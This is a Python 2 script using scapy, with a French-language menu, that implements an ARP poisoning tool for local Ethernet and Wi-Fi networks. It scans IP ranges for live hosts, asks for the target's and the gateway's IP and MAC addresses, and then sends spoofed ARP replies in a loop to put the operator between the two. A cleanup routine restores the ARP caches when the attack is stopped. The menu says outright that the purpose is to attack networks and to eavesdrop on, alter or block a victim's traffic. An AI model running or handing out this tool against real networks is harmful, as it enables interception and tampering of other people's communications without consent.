from scapy.all import  *
import os
import subprocess
import sys
import time 
import threading

def ip_scan(ip):
	print "SCAN DE L'ADRESSE IP "+ ip
	x,y  = arping(ip,verbose=0)
	x.show()

def scanning():
	print "[!]	debut de la phase de la reconnaissance " 
	for i in range(1,4):
		print"..."
		time.sleep(0.2)
	print " ----------------------------------------------------------- "
	ifconfig = subprocess.Popen('ifconfig wlan0 | grep \'inet adr\' | cut -d \":\" -f 2 | cut -d \" \" -f 1',shell=True,stdout = subprocess.PIPE) 
	addr = ifconfig.stdout.read().strip('\n')
	print "[!]	 votre adresse IP est : " + addr 
	print " ----------------------------------------------------------- "
	table = subprocess.Popen("route",shell=True,stdout=subprocess.PIPE)
	print table.stdout.read()
	print " ----------------------------------------------------------- "
	reseau = raw_input("[?]		donner l'addresse reseau :  ")
	reseau = reseau.split(".")
	compteur = 0 
	for num in reseau:
		if num == "0":
			break
		compteur = compteur +1
	res = ''
	for i in range(0,compteur):
		res = res + reseau[i]+ "."
	if compteur == 3 :
		print "[!]	 votre reseau a comme masque 255.255.255.0"
	elif compteur == 2 :
		print "[!]	 votre reseau a comme masque 255.255.0.0"

	if compteur == 3 :		
		plage = raw_input("[*]		definir la plage (exemple:1-50):")
		plage = plage.split("-")
		if len(plage) > 1 :
			try:
				threads = []
				for i in range(int(plage[0]),int(plage[1])):
					ip = res+str(i)

					t = threading.Thread(target=ip_scan,args=([ip]))
 					threads.append(t)
   					t.start()
					time.sleep(0.05)
					
			except KeyboardInterrupt:
				print "[!]	arret du scan "
				return menu()
		if len(plage) == 1 : 
			ip = res+str(plage[0])
			try:
				print "SCAN DE L'ADRESSE IP "+ ip
				x,y  = arping(ip,verbose=0)
				x.show()
			except KeyboardInterrupt:
				print "[!]	arret du scan "
				return menu()
	if compteur == 2:		
		plage1 = raw_input("[?]		definir la plage pour le 3 emme octet (exemple:1-2):")
		plage1=plage1.split("-")
		plage2 = raw_input("[?]		definir la plage pour le 4 emme octet (exemple:1-50):")
		plage2=plage2.split("-")
		if len(plage1) > 1 and len(plage2) > 1 :
			try:
				threads = []
				for i in range(plage1[0],plage1[1]):
					for j in range(int(plage2[0]),int(plage2[1])):
						ip = res+str(i)+"."+str(j)
						t = threading.Thread(target=ip_scan,args=([ip]))
 						threads.append(t)
   						t.start()
						time.sleep(0.05)
					
			except KeyboardInterrupt:
				print "[!]	arret du scan "
				return menu()
		if len(plage1) == 1 and len(plage2) > 1 :
			try:
				threads = []
				for j in range(int(plage2[0]),int(plage2[1])):
					ip = res+plage1[0]+"."+str(j)
					t = threading.Thread(target=ip_scan,args=([ip]))
 					threads.append(t)
   					t.start()
					time.sleep(0.05)
					
			except KeyboardInterrupt:
				print "[!]	arret du scan "
				return menu()
		if len(plage1) == 1 and len(plage2) == 1 :
			try:
				print "SCAN DE L'ADRESSE IP "+ ip
				x,y  = arping(ip,verbose=0)
				x.show()
			except KeyboardInterrupt:
				print "[!]	arret du scan "
				return menu()
	time.sleep(2)	
	print "[!]	Fin du scan "
	return menu()

def antidote(mac_client,ip_client,mac_gateway,ip_gateway):
	print " \n lancement de l'antidote \n "

	for i in range(1,4):
		print "..."
		time.sleep(1)

	antidote_client = ARP()
	antidote_gateway = ARP()

	antidote_client.hwdst=mac_client
	antidote_client.op=2
	antidote_client.pdst=ip_client
	antidote_client.hwsrc=mac_gateway
	antidote_client.psrc=ip_gateway

	antidote_gateway.hwdst=mac_gateway
	antidote_gateway.op=2
	antidote_gateway.pdst=ip_gateway
	antidote_gateway.hwsrc=mac_client
	antidote_gateway.psrc=ip_client

	for i in range(1,10):
		send(antidote_client)
		send(antidote_gateway)
	return

def poison(mac_client,ip_client,mac_gateway,ip_gateway):
	for i in range(1,4):
		print"..."
		time.sleep(0.2)
	poison_du_target = ARP()
	poison_du_gateway = ARP()

	poison_du_target.op = 2
	poison_du_target.psrc = ip_gateway
	poison_du_target.pdst = ip_client
	poison_du_target.hwdst = mac_client
	
	poison_du_gateway.op = 2
	poison_du_gateway.psrc = ip_client
	poison_du_gateway.pdst = ip_gateway
	poison_du_gateway.hwdst = mac_gateway
	try:
		while True:
           		 send(poison_du_target)
           		 send(poison_du_gateway)
           		 time.sleep(0.5)

        except KeyboardInterrupt:
		for i in range(1,4):
			print"..."
			time.sleep(0.2)
		print "[*]	lancement de l'antidote "
		antidote(mac_client,ip_client,mac_gateway,ip_gateway)
def menu():
	print " \t \t \t \t \tBenvenue"
	print " \n \n "
	print "cet outil va vous permettre de realiser l'ARP poisoning  pour attaquer tout reseau local utilisant le protocole de resolution d'adresse ARP , les cas les plus repandus etant les reseaux Ethernet et Wi-Fi. Cette technique vas nous permettre par la suite de detourner des flux de communications transitant entre une machine cible et une passerelle,ensuite ecouter, modifier ou encore bloquer les paquets reseaux."
	print " \n \n "
	print " 0- voir votre table de routage et cache ARP " 
 	print " 1- trouver les live hosts ( IP/MAC ) dans une plage dans mon reseau"  
	print " 2- trouver la correspondance IP/MAC d'un hote specifique "
	print " 3- lancer l'ARP poisoning"
	print " \n "
	choix=raw_input("[?] taper le numero correspondant a votre choix : ")
	if choix == "2" :
		ip_mac()
	if choix == "0":
		cache_et_route()
	if choix == "1":
		scanning()
	if choix == "3":
		arp_poisoning()
def arp_poisoning():
	print "'\n               (                                (\n                )           )        (                   )\n              (                       )      )            .---.\n          )              (     .-\"\"-.       (        (   /     \\\n         ( .-\"\"-.  (      )   / _  _ \\        )       )  |() ()|\n          / _  _ \\   )        |(_\\/_)|  .---.   (        (_ 0 _)\n          |(_)(_)|  ( .---.   (_ /\\ _) /     \\    .-\"\"-.  |xxx|\n          (_ /\\ _)   /     \\   |v==v|  |<\\ />|   / _  _ \\ \'---\'\n           |wwww|    |(\\ /)|(  \'-..-\'  (_ A _)   |/_)(_\\|\n           \'-..-\'    (_ o _)  )  .---.  |===|    (_ /\\ _)\n                      |===|  (  /     \\ \'---\'     |mmmm|\n                      \'---\'     |{\\ /}|           \'-..-\'\n                                (_ V _)\n                                 |\"\"\"|\n                                 \'---\'\'"
	print "[!] AVANT DE COMMENCER L'ATTAQUE VOUS DEVEZ CONNAITRE : \n (mac_client,ip_client,mac_gateway,ip_gateway) "
	ip_client = raw_input("[?] ip_client :")
	x,y = arping(ip_client,verbose=0)
	x.show()
	mac_client = raw_input("[?] coller ici la mac_client :")

	ip_gateway = raw_input("[?] ip_gateway :")
	x,y=arping(ip_gateway,verbose=0)
	x.show()
	mac_gateway = raw_input("[?] coller ici la  mac_gateway :")	

	poison(mac_client,ip_client,mac_gateway,ip_gateway)
	
	menu()
 
def ip_mac():
	
	ip=raw_input("[?] donner l'adresse IP : ")
	x,y  = arping(ip,verbose=0)
	x.show()
	choix = raw_input("[?] une autre (y/n): ") 
	if  choix.lower() == "y" :
		ip_mac()
	if choix.lower() == "n" : 
		return menu()

def cache_et_route():
	print " ----------------------------------------------------------- "
	ifconfig = subprocess.Popen('ifconfig wlan0 | grep \'inet adr\' | cut -d \":\" -f 2 | cut -d \" \" -f 1',shell=True,stdout = subprocess.PIPE) 
	addr = ifconfig.stdout.read().strip('\n')
	print "[!]	 votre adresse IP est : " + addr 
	print " ----------------------------------------------------------- "
	table = subprocess.Popen("route",shell=True,stdout=subprocess.PIPE)
	print table.stdout.read()
	print " ----------------------------------------------------------- "
	cache = subprocess.Popen("arp",shell=True,stdout=subprocess.PIPE)
	print cache.stdout.read()
	choix =raw_input("[!]  taper sur ENTRER  pour revenir au menu : ")
	return menu()

